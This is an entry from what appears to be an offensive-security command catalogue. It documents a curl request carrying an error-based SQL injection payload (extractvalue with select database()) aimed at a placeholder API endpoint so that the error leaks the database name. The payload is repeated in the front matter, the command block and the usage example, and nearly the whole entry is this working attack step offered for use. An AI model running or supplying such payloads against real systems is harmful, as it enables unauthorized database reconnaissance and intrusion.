---
id: cmd-uuid-003
name: curl-leak-database
type: command
executor: bash
data: >-
  curl -X GET
  "https://target.com/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+database()))))=1--%20aa"
  -H "Host: target.com"
output: Error message revealing database name
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.484Z'
platforms:
  - Linux
  - Web
tags:
  - sqli
  - curl
verified: false
validated: true
submitted: true
---

# curl-leak-database

## Command

```bash
curl -X GET "https://target.com/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+database()))))=1--%20aa" -H "Host: target.com"
```

## Description

Leaks current database name.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Method | Yes |
| URL | Payload | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://target.com/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+database()))))=1--%20aa"
```

## Expected Output

Error with DB name.

## Related

- [[Related Procedure: Leak-Current-Database-Name-via-SQL-Injection]]
